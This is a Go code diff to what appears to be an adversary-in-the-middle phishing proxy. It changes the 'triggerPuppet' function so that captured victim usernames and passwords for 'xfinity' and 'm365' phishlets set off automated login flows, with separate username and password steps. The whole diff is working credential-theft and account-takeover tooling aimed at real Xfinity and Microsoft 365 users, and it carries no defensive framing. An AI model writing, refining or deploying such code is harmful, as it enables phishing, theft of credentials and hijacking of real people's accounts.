@@ -2212,9 +2212,25 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 			if trigger.Token != "" && creds[trigger.Token] != "" {
 				shouldTrigger = true
 			}
-			// Fallback: if it's the standard login flow, trigger if we have username/password
-			if (phishletName == "xfinity" || phishletName == "m365") && (creds["username"] != "" || creds["password"] != "") {
-				shouldTrigger = true
+			
+			// Fallback: Standard login flow logic
+			if phishletName == "xfinity" || phishletName == "m365" {
+				if trigger.Name == "Xfinity Username Flow" || trigger.Id == "xfinity_username" {
+					// Only trigger username flow if we have username
+					if creds["username"] != "" && creds["password"] == "" {
+						shouldTrigger = true
+					}
+				} else if trigger.Name == "Xfinity Password Flow" || trigger.Id == "xfinity_password" {
+					// Only trigger password flow if we have password (and username)
+					if creds["password"] != "" {
+						shouldTrigger = true
+					}
+				} else {
+					// Legacy/Default triggers
+					if creds["username"] != "" || creds["password"] != "" {
+						shouldTrigger = true
+					}
+				}
 			}
 		}
 
